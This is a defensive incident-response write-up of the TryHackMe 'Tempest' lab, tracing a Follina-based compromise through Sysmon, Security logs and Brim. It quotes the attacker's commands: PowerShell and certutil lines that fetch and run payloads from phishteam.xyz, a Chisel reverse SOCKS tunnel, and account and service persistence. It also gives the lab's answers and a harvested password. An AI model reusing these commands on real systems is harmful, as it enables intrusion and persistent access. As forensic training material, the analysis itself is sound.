# TryHackMe Tempest - Incident Response Writeup

> **Room:** Tempest\
> **Focus:** DFIR / SOC investigation using Sysmon, Windows Event Logs,
> packet capture, Brim, Timeline Explorer, CyberChef, and VirusTotal\
> **Spoiler warning:** This writeup contains answers and indicators from
> the room.

## Overview

Tempest is an incident-response investigation centered on a compromised
Windows host. The investigation follows the intrusion from a malicious
Word document through command-and-control (C2), credential discovery,
tunneling, privilege escalation, and persistence.

The most useful lesson from this room was correlating multiple data
sources instead of treating network and endpoint telemetry separately:

-   **Sysmon** - process creation, DNS queries, network connections, and
    file activity.
-   **Windows Security logs** - account and group-management events.
-   **Brim / Zeek** - HTTP, connection, and transferred-file metadata
    from the PCAP.
-   **CyberChef** - Base64 decoding of C2 command results.
-   **VirusTotal** - pivoting from known hashes to SHA256 and tool
    identification.
-   **Timeline Explorer / Event Viewer** - chronological endpoint
    analysis.

------------------------------------------------------------------------

## Key Indicators

  Indicator                         Value
  --------------------------------- ----------------------
  Compromised host                  `TEMPEST`
  Compromised user                  `benimaru`
  Victim IP                         `192.168.254.107`
  Initial malicious domain          `phishteam.xyz`
  Initial malicious IP              `167.71.199.191`
  Stage 2 C2 domain                 `resolvecyber.xyz`
  Malicious document                `free_magicules.doc`
  Stage 2 payload                   `first.exe`
  Reverse proxy binary              `ch.exe`
  Reverse proxy tool                `chisel`
  Privilege escalation binary       `spf.exe`
  Privilege escalation tool         `PrintSpoofer`
  Elevated C2 binary                `final.exe`
  Harvested password                `infernotempest`
  WinRM port                        `5985`
  Chisel / later C2 port observed   `8080`

------------------------------------------------------------------------

# 1. Evidence Integrity

Before analyzing the artifacts, SHA256 hashes were calculated so that
the evidence could be identified and checked for integrity.

  --------------------------------------------------------------------------------------------------------
  Artifact                            SHA256
  ----------------------------------- --------------------------------------------------------------------
  `capture.pcapng`                    `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`

  `sysmon.evtx`                       `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`

  `windows.evtx`                      `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`
  --------------------------------------------------------------------------------------------------------

A simple PowerShell workflow for this is:

``` powershell
Get-FileHash .\capture.pcapng -Algorithm SHA256
Get-FileHash .\sysmon.evtx -Algorithm SHA256
Get-FileHash .\windows.evtx -Algorithm SHA256
```

------------------------------------------------------------------------

# 2. Initial Access - Malicious Word Document

Endpoint telemetry showed that the user opened:

``` text
free_magicules.doc
```

The affected account and machine were:

``` text
benimaru
TEMPEST
```

The Microsoft Word process associated with the document had PID:

``` text
496
```

Sysmon DNS telemetry (Event ID 22) showed that the malicious
infrastructure resolved to:

``` text
phishteam.xyz -> 167.71.199.191
```

The behavior was consistent with exploitation of:

``` text
CVE-2022-30190 - Follina
```

The malicious document caused execution that ultimately launched
PowerShell and retrieved additional payloads.

## Encoded payload

The payload contained a Base64-encoded PowerShell command. After
decoding it, the important behavior was:

``` powershell
$app = [Environment]::GetFolderPath('ApplicationData')
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip
Expand-Archive .\update.zip -DestinationPath .
rm update.zip
```

This places attacker-controlled content in the compromised user's
Startup folder:

``` text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

This is an important persistence location because its contents can
execute when the user logs on.

------------------------------------------------------------------------

# 3. Stage 2 Payload

After login, the implanted payload executed a hidden PowerShell command
that downloaded and ran another binary:

``` powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

The SHA256 of `first.exe` was:

``` text
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
```

The stage 2 payload communicated with:

``` text
resolvecyber.xyz:80
```

------------------------------------------------------------------------

# 4. C2 Protocol Analysis with Brim and CyberChef

The stage 2 C2 traffic was visible in the HTTP logs.

A useful Brim query was:

``` text
_path=="http" "resolvecyber.xyz" id.resp_p==80
| cut ts, host, id.resp_p, uri
| sort ts
```

The C2 used:

-   **HTTP method:** `GET`
-   **C2 path:** `/9ab62b5`
-   **Result parameter:** `q`
-   **Encoding:** Base64
-   **User agent clue:** Nim HTTP client
-   **Implementation language:** Nim

The traffic looked similar to:

``` text
/9ab62b5?q=<BASE64_DATA>
```

Copying the `q` value into CyberChef and applying **From Base64**
exposed the commands and their output.

## Examples of decoded C2 activity

### Working directory

``` text
pwd -

Path
----
C:\Windows\system32
```

### User enumeration

``` text
net users
```

This revealed local accounts including:

``` text
Administrator
benimaru
DefaultAccount
Guest
rimuru
WDAGUtilityAccount
```

### Administrator group enumeration

``` text
net localgroup administrators
```

This showed privileged local users such as `Administrator` and `rimuru`.
Later activity also showed `shion` as an administrator.

### Desktop enumeration

``` text
dir C:\users\benimaru\Desktop
```

This exposed:

``` text
automation.ps1
Microsoft Edge.lnk
```

------------------------------------------------------------------------

# 5. Credential Discovery

The attacker read:

``` text
C:\Users\Benimaru\Desktop\automation.ps1
```

The script contained plaintext credentials:

``` powershell
$user = "TEMPEST\benimaru"
$pass = "infernotempest"

$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
```

The harvested password was therefore:

``` text
infernotempest
```

This is a good example of why plaintext credentials in automation
scripts are dangerous even when the script later converts the password
into a `SecureString`.

------------------------------------------------------------------------

# 6. Network Enumeration and WinRM

The attacker enumerated listening TCP ports using output consistent
with:

``` cmd
netstat -ano -p tcp
```

Among the listening ports was:

``` text
0.0.0.0:5985 LISTENING
```

TCP `5985` is the default HTTP port for **Windows Remote Management
(WinRM)** and can support PowerShell remoting and remote command
execution.

The attacker subsequently used the harvested credentials to authenticate
through:

``` text
WinRM
```

One important investigative lesson was that searching only Zeek `conn`
records for inbound traffic did not necessarily expose this answer. A
locally listening socket does not need to receive a connection during
the capture. The decisive evidence was the **decoded C2 command
output**.

------------------------------------------------------------------------

# 7. Reverse SOCKS Proxy with Chisel

The attacker downloaded another executable:

``` powershell
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

A later directory listing confirmed:

``` text
C:\Users\benimaru\Downloads\ch.exe
Size: 8,230,912 bytes
```

The reverse SOCKS connection was established with:

``` cmd
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

The syntax, particularly `R:socks`, was a strong indicator of
**Chisel**.

## Hash identification

Brim's Zeek file record showed:

``` text
mime_type: application/x-dosexec
seen_bytes: 8230912
MD5: 527c71c523d275c8367b67bbebf48e9f
```

Because the Zeek configuration had calculated MD5/SHA1 but not SHA256,
the MD5 was used as a VirusTotal pivot.

The corresponding SHA256 was:

``` text
8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

Tool identification:

``` text
chisel
```

This demonstrated a useful DFIR technique:

``` text
PCAP -> Zeek file record -> MD5 -> VirusTotal -> SHA256 -> tool identification
```

------------------------------------------------------------------------

# 8. Privilege Escalation

After establishing stable access, the attacker checked the current
privileges:

``` cmd
whoami /priv
```

The privilege relevant to the next attack was:

``` text
SeImpersonatePrivilege
```

The attacker downloaded:

``` text
spf.exe
```

SHA256:

``` text
8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
```

Hash/tool analysis identified the executable as:

``` text
PrintSpoofer
```

PrintSpoofer abuses `SeImpersonatePrivilege` to obtain a
higher-privileged token and can be used to escalate to:

``` text
NT AUTHORITY\SYSTEM
```

After privilege escalation, the attacker used another executable:

``` text
final.exe
```

Sysmon Event IDs **3 (Network Connection)** and **22 (DNS Query)** were
useful for correlating the new C2 activity. `final.exe` communicated
over:

``` text
8080
```

At this stage it was important to remove filters restricted to the
original low-privilege user because the malicious processes were now
executing as:

``` text
NT AUTHORITY\SYSTEM
```

------------------------------------------------------------------------

# 9. Persistence and Full Compromise

Once SYSTEM access was achieved, the attacker established several forms
of administrative persistence.

## Creation of local accounts

Windows Security Event ID:

``` text
4720 - A user account was created
```

identified two attacker-created accounts:

``` text
shion
shuna
```

The required alphabetical ordering is:

``` text
shion,shuna
```

Before successful creation, attempts failed because the attacker
omitted:

``` text
/add
```

from the `net user` command.

## Addition to Administrators

The attacker added `shion` to the local Administrators group:

``` cmd
net localgroup administrators /add shion
```

Windows Security Event ID:

``` text
4732 - A member was added to a security-enabled local group
```

confirmed the sensitive group modification.

## Malicious service persistence

The attacker also created an automatically starting Windows service
pointing to the elevated C2 binary:

``` cmd
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

This creates:

``` text
Service: TempestUpdate2
Binary:  C:\ProgramData\final.exe
Startup: Automatic
```

This is a strong persistence mechanism because the malicious C2
executable is registered as a Windows service and configured to start
automatically.

------------------------------------------------------------------------

# Attack Timeline Summary

``` text
free_magicules.doc opened by WINWORD.EXE
        |
        v
CVE-2022-30190 / Follina exploitation
        |
        v
PowerShell execution
        |
        +--> update.zip placed in Startup location
        |
        v
first.exe downloaded and executed
        |
        v
C2 -> resolvecyber.xyz:80
        |
        v
Base64-encoded command/output channel
        |
        +--> system/user enumeration
        +--> directory enumeration
        +--> automation.ps1 discovered
        |
        v
Plaintext credential harvested
TEMPEST\benimaru : infernotempest
        |
        v
Listening ports enumerated
        |
        +--> TCP/5985 WinRM discovered
        |
        v
ch.exe downloaded
        |
        v
Chisel reverse SOCKS
167.71.199.191:8080 R:socks
        |
        v
WinRM authentication using harvested credentials
        |
        v
whoami /priv
        |
        +--> SeImpersonatePrivilege
        |
        v
spf.exe / PrintSpoofer
        |
        v
Privilege escalation to NT AUTHORITY\SYSTEM
        |
        v
final.exe C2 over TCP/8080
        |
        +--> create shion
        +--> create shuna
        +--> add shion to Administrators
        |
        v
Create TempestUpdate2 service
C:\ProgramData\final.exe
        |
        v
Persistent administrative access
```

------------------------------------------------------------------------

# Useful Event IDs

  -----------------------------------------------------------------------
  Event ID                Source                  Why it mattered
  ----------------------- ----------------------- -----------------------
  `1`                     Sysmon                  Process creation and
                                                  command-line
                                                  reconstruction

  `3`                     Sysmon                  Network connections
                                                  from malicious
                                                  executables

  `22`                    Sysmon                  DNS queries and
                                                  C2-domain correlation

  `4720`                  Windows Security        Local user account
                                                  creation

  `4732`                  Windows Security        Addition to a
                                                  security-enabled local
                                                  group
  -----------------------------------------------------------------------

------------------------------------------------------------------------

# Useful Brim Queries

## All HTTP traffic

``` text
_path=="http"
```

## C2 HTTP traffic

``` text
_path=="http" "resolvecyber.xyz" id.resp_p==80
| cut ts, host, id.resp_p, uri
| sort ts
```

## Connection records involving the victim

``` text
_path=="conn" 192.168.254.107
```

## Search a specific destination port

``` text
_path=="conn" id.resp_p==5985
```

## Search either side of a connection for a port

``` text
_path=="conn" (id.orig_p==5985 or id.resp_p==5985)
```

## Zeek transferred-file records

``` text
_path=="files"
```

## Windows executable transfers

``` text
_path=="files" mime_type=="application/x-dosexec"
```

------------------------------------------------------------------------

# Indicators of Compromise

## Domains

``` text
phishteam.xyz
resolvecyber.xyz
```

## IP addresses

``` text
167.71.199.191
192.168.254.107
```

## Files

``` text
free_magicules.doc
first.exe
ch.exe
spf.exe
final.exe
automation.ps1
```

## Accounts

``` text
shion
shuna
```

## Services

``` text
TempestUpdate2
```

## Important hashes

### first.exe

``` text
SHA256: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
```

### ch.exe / Chisel

``` text
MD5:    527c71c523d275c8367b67bbebf48e9f
SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

### spf.exe / PrintSpoofer

``` text
SHA256: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
```

------------------------------------------------------------------------

# MITRE ATT&CK Mapping

The activity observed in Tempest maps broadly to several ATT&CK
techniques:

  -----------------------------------------------------------------------
  Activity                            Technique
  ----------------------------------- -----------------------------------
  Malicious document / exploitation   Exploitation for Client Execution

  PowerShell execution                T1059.001 - PowerShell

  Startup folder persistence          T1547.001 - Registry Run Keys /
                                      Startup Folder

  Credential discovery in script      T1552.001 - Credentials In Files

  System/network discovery            T1049 / T1016 family

  Chisel tunneling                    T1572 - Protocol Tunneling

  WinRM                               T1021.006 - Windows Remote
                                      Management

  PrintSpoofer privilege escalation   T1134 / token impersonation-related
                                      behavior

  Local account creation              T1136.001 - Local Account

  Administrators group modification   T1098 - Account Manipulation

  Windows service persistence         T1543.003 - Windows Service
  -----------------------------------------------------------------------

------------------------------------------------------------------------

# Key Takeaways

1.  **Follow the timeline.** Once a suspicious event is identified, the
    events immediately before and after it often reveal the attacker's
    next objective.

2.  **Correlate endpoint and network telemetry.** Brim showed the C2
    traffic, while Sysmon showed which executable generated it.

3.  **Decode application-layer data.** The attacker's commands were
    hidden inside Base64 URI parameters. Raw `conn` records alone were
    not enough.

4.  **Do not confuse observed connections with listening sockets.** The
    WinRM answer came from decoded `netstat` output, not simply from
    seeing an inbound connection to port 5985.

5.  **Hashes are pivot points.** Even when Zeek only supplied an MD5, it
    was enough to locate the same sample and obtain its SHA256.

6.  **Parent/child relationships matter.** After privilege escalation,
    child processes of `final.exe` and processes running as
    `NT AUTHORITY\SYSTEM` became high-value investigation targets.

7.  **Windows Security logs provide authoritative account-change
    evidence.** Event IDs 4720 and 4732 clearly documented attacker
    persistence.

------------------------------------------------------------------------

## Final Compromise Chain

The attacker weaponized a malicious Word document to obtain code
execution, established a Nim-based HTTP C2 channel, harvested plaintext
credentials, discovered WinRM, deployed Chisel for reverse SOCKS
tunneling, authenticated through WinRM, abused `SeImpersonatePrivilege`
with PrintSpoofer to obtain SYSTEM, deployed `final.exe` as a new C2
payload, created persistent local accounts, promoted an account into
Administrators, and registered the malicious payload as an automatically
starting Windows service.

The host should be considered **fully compromised**.
